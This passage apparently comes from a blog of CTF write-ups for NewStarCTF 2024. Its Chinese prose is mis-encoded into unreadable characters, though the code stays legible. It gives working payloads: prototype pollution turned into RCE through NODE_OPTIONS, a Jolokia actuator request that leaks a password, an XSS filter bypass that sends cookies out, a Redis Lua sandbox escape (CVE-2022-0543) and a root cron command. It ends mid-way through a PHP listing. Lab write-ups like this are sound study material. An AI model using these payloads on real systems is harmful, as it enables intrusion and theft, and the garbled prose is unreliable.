</h3><h4 id="çŸ¥è¯†ç‚¹dockerçš„ä½¿ç”¨åŸå‹é“¾æ±¡æŸ“jsä»£ç å®¡è®¡">çŸ¥è¯†ç‚¹ï¼šdockerçš„ä½¿ç”¨ï¼ˆï¼‰ã€åŸå‹é“¾æ±¡æŸ“ï¼Œjsä»£ç å®¡è®¡
</h4><p>é¢˜ç›®è¯´æœ€å¥½æœ¬åœ°é€šäº†å†æ‰“ï¼Œè¿™é‡Œç›´æ¥æ‹‰dockerï¼ˆä¹Ÿæ˜¯å­¦äº†ä¸€æ‰‹ï¼‰</p>
<p>è¡¥å……è¯´æ˜ä¸€ä¸‹dockerï¼Œé¢˜ç›®ç»™çš„æºä»£ç é‡Œæœ‰dockerfileæ–‡ä»¶ï¼Œè¿™ä¸ªæ˜¯ç”¨æ¥å°è£…é•œåƒçš„ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œé¢ä¼šå‘Šè¯‰dockeræˆ‘ä»¬éœ€è¦ä»€ä¹ˆç¯å¢ƒï¼Œä»–ä¼šä»ä»–çš„åº“é‡Œä¸‹è½½è¿™äº›ç¯å¢ƒï¼Œç„¶åå°è£…æˆä¸€ä¸ªé•œåƒã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker build -t ezpollute .
</span></span><span class="line"><span class="cl">//å»ºé€ ä¸€ä¸ªåä¸ºezpolluteçš„é•œåƒ
</span></span><span class="line"><span class="cl">//dockerfileåœ¨å½“å‰ç›®å½•ä¸‹
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæˆ‘ä»¬éœ€è¦è¿è¡Œå®¹å™¨ï¼Œå°†è¿™ä¸ªé•œåƒè¿è¡Œä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker run -d -p 3000:3000 --name ezpollute ezpollute
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//docker run: è¿™æ˜¯è¿è¡Œå®¹å™¨çš„ä¸»å‘½ä»¤ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//-d: è¿™æ˜¯ &#34;detached&#34;ï¼ˆåˆ†ç¦»ï¼‰æ¨¡å¼çš„ç¼©å†™ã€‚å®ƒè¡¨ç¤ºè®©å®¹å™¨åœ¨åå°è¿è¡Œ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//-pï¼šå®ƒå°†å®¿ä¸»æœºï¼ˆä½ çš„ç”µè„‘ï¼‰çš„ç«¯å£å’Œå®¹å™¨å†…éƒ¨çš„ç«¯å£è¿æ¥èµ·æ¥ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//--name ezpollute: è¿™ä¸ªé€‰é¡¹ç”¨æ¥ç»™æ–°åˆ›å»ºçš„å®¹å™¨æŒ‡å®šä¸€ä¸ªå”¯ä¸€çš„åå­—ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//ezpolluteï¼šDockerä¼šæ ¹æ®è¿™ä¸ªåå­—æ‰¾åˆ°ä½ åä¸º ezpollute çš„é•œåƒï¼Œå¹¶ç”¨å®ƒæ¥åˆ›å»ºå®¹å™¨ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åæ˜¯é‡å¯è¿™ä¸ªå®¹å™¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker restart ezpollute
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»™äº†æºç ï¼Œå®¡è®¡ä¸€ä¸‹ï¼Œåœ¨index.jsçš„/configè·¯ç”±å‘ç°äº†merge()ï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯æ¼æ´ç‚¹äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">merge() å‡½æ•°çš„ç›®çš„æ˜¯å°†ä¸€ä¸ªæˆ–å¤šä¸ªæºå¯¹è±¡ï¼ˆsourceï¼‰çš„å±æ€§é€’å½’åœ°åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡ï¼ˆtargetï¼‰ä¸­ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">clone()çš„ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ·±æ‹·è´ã€‚å¾ˆå¤š clone å‡½æ•°çš„å®ç°æ–¹å¼ä¹‹ä¸€å°±æ˜¯å°†æºå¯¹è±¡åˆå¹¶åˆ°ä¸€ä¸ªæ–°çš„ç©ºå¯¹è±¡ä¸­ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶ååœ¨/utils/merge.jsé‡Œå‘ç°äº†å¯¹protoçš„è¿‡æ»¤</p>
<p>å…ˆæŠ“åŒ…ï¼Œåœ¨æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡æ—¶ï¼Œå¯ä»¥æŠ“åˆ°token</p>
<p><img src="/p/newstarctf2024/image-20250707204146597.png"
	width="1451"
	height="507"
	srcset="/p/newstarctf2024/image-20250707204146597_hu8763408691249293553.png 480w, /p/newstarctf2024/image-20250707204146597_hu225864728065443295.png 1024w"
	loading="lazy"
	
		alt="image-20250707204146597"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="686px"
	
></p>
<p>ç„¶åå†åšå›¾åƒå¤„ç†æ—¶ï¼Œå¯ä»¥å‘ç°å»åˆ°äº†/configè·¯ç”±ï¼Œå¹¶ä¼ äº†jsonæ•°æ®ï¼Œè¿™é‡Œå°±æ˜¯ä¼ payloadçš„åœ°æ–¹äº†</p>
<p><img src="/p/newstarctf2024/image-20250707204247404.png"
	width="1408"
	height="487"
	srcset="/p/newstarctf2024/image-20250707204247404_hu3759774755526447018.png 480w, /p/newstarctf2024/image-20250707204247404_hu663888008981345023.png 1024w"
	loading="lazy"
	
		alt="image-20250707204247404"
	
	
		class="gallery-image" 
		data-flex-grow="289"
		data-flex-basis="693px"
	
></p>
<p>æ·»åŠ æ°´å°æˆåŠŸåä¼šè¿›å…¥/processè·¯ç”±ï¼Œè¿™ä¸ªæ—¶å€™ä¼šè°ƒç”¨forkåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¦‚æœæˆ‘ä»¬æ±¡æŸ“äº†<code>NODE_OPTIONS</code> å’Œ <code>env</code>ï¼Œåœ¨ <code>env</code> ä¸­å†™å…¥æ¶æ„ä»£ç ï¼Œé‚£ä¹ˆ<code>fork</code> åœ¨åˆ›å»ºå­è¿›ç¨‹æ—¶å°±ä¼šé¦–å…ˆåŠ è½½æ¶æ„ä»£ç ï¼Œä»è€Œå®ç° RCE</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;constructor&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;prototype&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;NODE_OPTIONS&#34;</span><span class="p">:</span> <span class="s2">&#34;--require /proc/self/environ&#34;</span><span class="p">,</span> <span class="s2">&#34;env&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="s2">&#34;EVIL&#34;</span><span class="p">:</span><span class="s2">&#34;console.log(require(</span><span class="se">\\\&#34;</span><span class="s2">child_process</span><span class="se">\\\&#34;</span><span class="s2">).execSync(</span><span class="se">\\\&#34;</span><span class="s2">touch /tmp/pp2rce2</span><span class="se">\\\&#34;</span><span class="s2">).toString())//&#34;</span><span class="p">}}}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŸç†å¦‚ä¸‹ï¼š</p>
<p><img src="/p/newstarctf2024/image-20250707225146540.png"
	width="1083"
	height="942"
	srcset="/p/newstarctf2024/image-20250707225146540_hu17217492977529693313.png 480w, /p/newstarctf2024/image-20250707225146540_hu11386738128674697717.png 1024w"
	loading="lazy"
	
		alt="image-20250707225146540"
	
	
		class="gallery-image" 
		data-flex-grow="114"
		data-flex-basis="275px"
	
></p>
<p>configæŠ“åŒ…ï¼Œç„¶åæ‰“payloadï¼Œç„¶åpostè®¿é—®ä¸€ä¸‹/processï¼Œæœ€åå»/script.js</p>
<p><img src="/p/newstarctf2024/image-20250707222932720.png"
	width="1863"
	height="634"
	srcset="/p/newstarctf2024/image-20250707222932720_hu11325915464190790746.png 480w, /p/newstarctf2024/image-20250707222932720_hu4147580035355388765.png 1024w"
	loading="lazy"
	
		alt="image-20250707222932720"
	
	
		class="gallery-image" 
		data-flex-grow="293"
		data-flex-basis="705px"
	
></p>
<p><img src="/p/newstarctf2024/image-20250707222455240.png"
	width="643"
	height="144"
	srcset="/p/newstarctf2024/image-20250707222455240_hu10487651080804791534.png 480w, /p/newstarctf2024/image-20250707222455240_hu2688527005323898949.png 1024w"
	loading="lazy"
	
		alt="image-20250707222455240"
	
	
		class="gallery-image" 
		data-flex-grow="446"
		data-flex-basis="1071px"
	
></p>
<h3 id="éšè—çš„å¯†ç ">éšè—çš„å¯†ç 
</h3><h4 id="çŸ¥è¯†ç‚¹çœ‹ä¸æ‡‚">çŸ¥è¯†ç‚¹ï¼šçœ‹ä¸æ‡‚
</h4><p>dirsearchè¯·æ±‚ä¸€ç›´é”™è¯¯ï¼Œåªèƒ½ç›´æ¥çœ‹wpäº†</p>
<p>/actuator/jolokia - è¿™æ˜¯ä¸€ä¸ªç›‘æ§ç«¯ç‚¹
/actuator/env - ç¯å¢ƒå˜é‡ç«¯ç‚¹</p>
<p>é€šè¿‡ Jolokia æ¥å£ï¼Œè¯·æ±‚è®¿é—® Spring Boot åº”ç”¨ç¨‹åºä¸­çš„ SpringApplication,type=Admin MBeanï¼Œå¹¶æ‰§è¡Œå…¶æä¾›çš„ getProperty æ“ä½œï¼ŒåŒæ—¶å°† &ldquo;caef11.passwd&rdquo; ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¿™ä¸ªæ“ä½œã€‚</p>
<p>æˆ‘ä»¬åœ¨/actuator/jolokiaå¤„å‘åŒ…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: application/json {&#34;mbean&#34;: &#34;org.springframework.boot:name=SpringApplication,type=Admin&#34;,&#34;operation&#34;: &#34;getProperty&#34;, &#34;type&#34;: &#34;EXEC&#34;, &#34;arguments&#34;: [&#34;caef11.passwd&#34;]}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250708143229124.png"
	width="1996"
	height="599"
	srcset="/p/newstarctf2024/image-20250708143229124_hu8124205574941807653.png 480w, /p/newstarctf2024/image-20250708143229124_hu5732654819934095976.png 1024w"
	loading="lazy"
	
		alt="image-20250708143229124"
	
	
		class="gallery-image" 
		data-flex-grow="333"
		data-flex-basis="799px"
	
></p>
<p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç <code>caef11</code>ã€<code>123456qWertAsdFgZxCvB!@#</code></p>
<p>ç™»å½•æˆåŠŸ</p>
<p>é€šè¿‡å†™å®šæ—¶ä»»åŠ¡ï¼ˆè®¡åˆ’ä»»åŠ¡ï¼‰çš„æ–¹å¼ï¼Œä»¥ flag ä¸ºæ–‡ä»¶ååœ¨æ ¹ç›®å½•åˆ›å»ºæ–°æ–‡ä»¶ï¼Œé€šè¿‡ <code>ls</code> æŸ¥çœ‹ flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    */1 * * * * root cat /flag | xargs -I {} touch /tmp/{}
</span></span><span class="line"><span class="cl">/**å‘½ä»¤æ„æ€æ˜¯ä½œä¸º Cron ä»»åŠ¡ï¼Œä¼šæ¯åˆ†é’Ÿä»¥ root ç”¨æˆ·èº«ä»½æ‰§è¡Œï¼š
</span></span><span class="line"><span class="cl">è¯»å– /flag æ–‡ä»¶çš„å†…å®¹ã€‚
</span></span><span class="line"><span class="cl">å°† /flag çš„å†…å®¹é€šè¿‡ç®¡é“ä¼ é€’ç»™ xargsã€‚
</span></span><span class="line"><span class="cl">xargs å°†æ¥æ”¶åˆ°çš„ flag å†…å®¹ä½œä¸ºæ–‡ä»¶åï¼Œåœ¨ /tmp/ ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="D:%5cblog%5chugo_extended_0.133.1_windows-amd64%5cdev%5ccontent%5cpost%5cNewstarCTF2024%e5%a4%8d%e7%8e%b0%5cimage-20250708143838588.png"
	
	
	
	loading="lazy"
	
		alt="image-20250708143838588"
	
	
></p>
<p>æœ€ååœ¨å‘½ä»¤é‚£ls /</p>
<p><img src="/p/newstarctf2024/image-20250708144445087.png"
	width="1252"
	height="522"
	srcset="/p/newstarctf2024/image-20250708144445087_hu10672756587120428170.png 480w, /p/newstarctf2024/image-20250708144445087_hu10141069710675139604.png 1024w"
	loading="lazy"
	
		alt="image-20250708144445087"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="575px"
	
></p>
<h2 id="week5">Week5
</h2><h3 id="pangbai-è¿‡å®¶å®¶5">PangBai è¿‡å®¶å®¶ï¼ˆ5ï¼‰
</h3><h4 id="çŸ¥è¯†ç‚¹ä¸å‡ºç½‘xss">çŸ¥è¯†ç‚¹ï¼šä¸å‡ºç½‘xss
</h4><p>ç»™äº†æºç çš„xssï¼Œflagåœ¨cookieä¸­ï¼Œä½†æ˜¯æœ‰wafåœ¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function safe_html(str: string) {
</span></span><span class="line"><span class="cl">    return str
</span></span><span class="line"><span class="cl">        .replace(/&lt;.*&gt;/igm, &#39;&#39;)
</span></span><span class="line"><span class="cl">        .replace(/&lt;\.*&gt;/igm, &#39;&#39;)
</span></span><span class="line"><span class="cl">        .replace(/&lt;.*&gt;.*&lt;\/.*&gt;/igm, &#39;&#39;)
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>i</code> æ ‡å¿—ï¼šå¿½ç•¥å¤§å°å†™</p>
<p><code>g</code> æ ‡å¿—ï¼šå…¨å±€åŒ¹é…ï¼Œæ‰¾åˆ°æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„å†…å®¹</p>
<p><code>m</code> æ ‡å¿—ï¼šå¤šè¡ŒåŒ¹é…ï¼Œæ¯æ¬¡åŒ¹é…æ—¶æŒ‰è¡Œè¿›è¡ŒåŒ¹é…ï¼Œè€Œä¸æ˜¯å¯¹æ•´ä¸ªå­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ï¼ˆä¸ä¹‹å¯¹åº”çš„æ˜¯ <code>s</code> æ ‡å¿—ï¼Œè¡¨ç¤ºå•è¡Œæ¨¡å¼ï¼Œå°†æ¢è¡Œç¬¦çœ‹ä½œå­—ç¬¦ä¸²ä¸­çš„æ™®é€šå­—ç¬¦ï¼‰</p>
<p>ç”±äº <code>m</code> çš„å­˜åœ¨ï¼ŒåŒ¹é…å¼€å§‹ä¸ºè¡Œé¦–ï¼ŒåŒ¹é…ç»“æŸä¸ºè¡Œå°¾ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æŠŠ <code>&lt;</code> å’Œ <code>&gt;</code> æ”¾åœ¨ä¸åŒè¡Œå³å¯</p>
<p><img src="D:%5cblog%5chugo_extended_0.133.1_windows-amd64%5cdev%5ccontent%5cpost%5cNewstarCTF2024%e5%a4%8d%e7%8e%b0%5cimage-20250708150433141.png"
	
	
	
	loading="lazy"
	
		alt="image-20250708150433141"
	
	
></p>
<p>å¯æƒœä¸å‡ºç½‘ï¼Œæ‰€ä»¥å‘ä¸å‡ºæ¥ï¼Œæˆ‘ä»¬éœ€è¦å†™jsä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script
</span></span><span class="line"><span class="cl">&gt;
</span></span><span class="line"><span class="cl">fetch(&#39;/api/send&#39;, {
</span></span><span class="line"><span class="cl">    method: &#39;POST&#39;,
</span></span><span class="line"><span class="cl">    headers: {&#39;Content-Type&#39;: &#39;application/json&#39;},
</span></span><span class="line"><span class="cl">    body: JSON.stringify({&#39;title&#39;: &#34;Cookie&#34;, &#39;content&#39;: document.cookie})
</span></span><span class="line"><span class="cl">})
</span></span><span class="line"><span class="cl">&lt;/script
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250708150721940.png"
	width="1087"
	height="484"
	srcset="/p/newstarctf2024/image-20250708150721940_hu11319919129574408648.png 480w, /p/newstarctf2024/image-20250708150721940_hu16700608772836732284.png 1024w"
	loading="lazy"
	
		alt="image-20250708150721940"
	
	
		class="gallery-image" 
		data-flex-grow="224"
		data-flex-basis="539px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">è§£é‡Šä¸€ä¸‹
</span></span><span class="line"><span class="cl">fetch(&#39;/api/send&#39;, { ... })
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">fetch() æ˜¯ç°ä»£æµè§ˆå™¨å†…ç½®çš„ä¸€ä¸ªåŠŸèƒ½ï¼ˆAPIï¼‰ï¼Œç”¨äºå‘æœåŠ¡å™¨å‘é€ç½‘ç»œè¯·æ±‚ã€‚
</span></span><span class="line"><span class="cl">ç¬¬ä¸€ä¸ªå‚æ•° &#39;/api/send&#39; æ˜¯è¯·æ±‚çš„ç›®æ ‡ URLï¼ˆåœ°å€ï¼‰ã€‚è¿™æ˜¯ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼Œæ„å‘³ç€è¯·æ±‚ä¼šè¢«å‘é€åˆ°å½“å‰ç½‘ç«™åŸŸåä¸‹çš„ /api/send è¿™ä¸ªåœ°å€
</span></span><span class="line"><span class="cl">ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç”¨æ¥è¯¦ç»†å®šä¹‰è¿™ä¸ªè¯·æ±‚ã€‚
</span></span><span class="line"><span class="cl">method: &#39;POST&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">è¿™æŒ‡å®šäº† HTTP è¯·æ±‚çš„æ–¹æ³•ä¸º POSTã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">headers æ˜¯è¯·æ±‚å¤´ï¼Œå®ƒåŒ…å«äº†å…³äºè¯·æ±‚çš„å…ƒæ•°æ®ï¼ˆé™„åŠ ä¿¡æ¯ï¼‰ã€‚
</span></span><span class="line"><span class="cl">&#39;Content-Type&#39;: &#39;application/json&#39; è¿™è¡Œå‘Šè¯‰æœåŠ¡å™¨ï¼Œæˆ‘ä»¬é€šè¿‡è¿™æ¬¡è¯·æ±‚å‘é€çš„æ•°æ®ï¼ˆå³ bodyï¼‰æ˜¯ JSON æ ¼å¼çš„ã€‚è¿™æ ·æœåŠ¡å™¨å°±çŸ¥é“å¦‚ä½•æ­£ç¡®è§£ææ”¶åˆ°çš„æ•°æ®ã€‚
</span></span><span class="line"><span class="cl">body: JSON.stringify({&#39;title&#39;: &#34;Cookie&#34;, &#39;content&#39;: document.cookie})
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">è¿™æ˜¯è¿™æ¬¡è¯·æ±‚çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¦å‘é€ç»™æœåŠ¡å™¨çš„å…·ä½“æ•°æ®ã€‚
</span></span><span class="line"><span class="cl">document.cookieï¼šè¿™æ˜¯ä¸€ä¸ªéå¸¸å…³é”®çš„ JavaScript å±æ€§ã€‚å®ƒä¼šè¿”å›å½“å‰é¡µé¢æ‰€åœ¨åŸŸä¸‹çš„æ‰€æœ‰ cookieï¼Œå½¢å¼ä¸ºä¸€ä¸ªé•¿å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ &#34;name=zhangsan; id=123; session=xyz&#34;ï¼‰ã€‚
</span></span><span class="line"><span class="cl">{&#39;title&#39;: &#34;Cookie&#34;, &#39;content&#39;: document.cookie}ï¼šè¿™æ˜¯ä¸€ä¸ª JavaScript å¯¹è±¡ã€‚å®ƒåˆ›å»ºäº†ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªé”®å€¼å¯¹çš„ç»“æ„ï¼š
</span></span><span class="line"><span class="cl">title çš„å€¼æ˜¯å›ºå®šçš„å­—ç¬¦ä¸² &#34;Cookie&#34;ã€‚
</span></span><span class="line"><span class="cl">content çš„å€¼æ˜¯ä¸Šé¢è·å–åˆ°çš„ document.cookie å­—ç¬¦ä¸²ã€‚
</span></span><span class="line"><span class="cl">JSON.stringify(...)ï¼šè¿™ä¸ªå‡½æ•°å°† JavaScript å¯¹è±¡è½¬æ¢æˆ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œä¸Šé¢çš„å¯¹è±¡ä¼šè¢«è½¬æ¢ä¸º &#39;{&#34;title&#34;:&#34;Cookie&#34;,&#34;content&#34;:&#34;name=zhangsan; id=123; session=xyz&#34;}&#39;ã€‚è¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯æœ€ç»ˆå‘é€ç»™æœåŠ¡å™¨çš„æ•°æ®ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ez_redis">ez_redis
</h3><h4 id="çŸ¥è¯†ç‚¹redis-luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œcve-2022-0543">çŸ¥è¯†ç‚¹ï¼šRedis Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-0543ï¼‰
</h4><p>www.zipè·å–æºç ï¼Œæœ‰ä¸ªevalï¼Œä½†æ˜¯è¿‡æ»¤äº†setå’Œphp</p>
<p>æœç´¢ Redis å¸¸â½¤åˆ©â½¤â½…æ³•ï¼Œå‘ç°å¦‚æœè¿‡æ»¤äº† <code>set</code> <code>php</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾ˆéš¾é€šè¿‡å†™ webshellï¼Œå†™â¼Šè®¡åˆ’ä»»åŠ¡ã€ä¸»ä»å¤åˆ¶æ¥è¿›è¡Œ getshell</p>
<p>æ‰¾åˆ°<a class="link" href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md"  target="_blank" rel="noopener"
    >Redis Lua æ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-0543ï¼‰</a>æ”¹å‘½ä»¤ç›´æ¥æ‰“å°±è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">eval</span> <span class="s1">&#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;cat /f*&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39;</span> <span class="mi">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250708152908232.png"
	width="1735"
	height="606"
	srcset="/p/newstarctf2024/image-20250708152908232_hu12876863733443687997.png 480w, /p/newstarctf2024/image-20250708152908232_hu8250629559296462073.png 1024w"
	loading="lazy"
	
		alt="image-20250708152908232"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="687px"
	
></p>
<p>è¿™é‡Œä¹Ÿå­¦ä¹ ä¸€ä¸‹rediså¸¸ç”¨å§¿åŠ¿</p>
<p><a class="link" href="https://xz.aliyun.com/news/12517"  target="_blank" rel="noopener"
    >Redisæ¼æ´åŠå…¶åˆ©ç”¨æ–¹å¼-å…ˆçŸ¥ç¤¾åŒº</a></p>
<h3 id="è‡­çš®å¹æ³¡æ³¡">è‡­çš®å¹æ³¡æ³¡
</h3><h4 id="çŸ¥è¯†ç‚¹ååºåˆ—åŒ–æ•°ç»„çš„å·§ç”¨unlinkçš„è¿‡æ»¤">çŸ¥è¯†ç‚¹ï¼šååºåˆ—åŒ–æ•°ç»„çš„å·§ç”¨ã€unlinkçš„è¿‡æ»¤
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">error_reporting(0);
</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class study
</span></span><span class="line"><span class="cl">{
